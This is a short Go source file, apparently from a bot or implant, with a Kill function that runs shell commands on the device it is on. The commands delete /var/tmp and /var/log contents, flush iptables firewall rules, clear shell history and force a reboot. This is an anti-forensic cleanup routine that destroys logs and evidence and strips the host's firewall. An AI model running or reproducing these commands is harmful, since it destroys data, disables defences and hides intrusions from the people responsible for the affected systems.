package security

import (
	"syscall"
)

//-> [ERROR] delete bin before run when update
/*func SafeExit() {
	defer syscall.Exit(0)

	ExecuteGroup([]string{
		"rm -rf /var/tmp/*",
		"iptables -F",
	})
}*/

func SafeExit() {
	syscall.Exit(0)
}

func Kill() {
	defer syscall.Exit(0) // in case of the device won't reboot

	ExecuteGroup([]string{
		"rm -rf /var/tmp/*",
		"rm -rf /var/log/*",
		"iptables -F",
		"history -c",
		"sudo reboot",
		"reboot",
	})
}
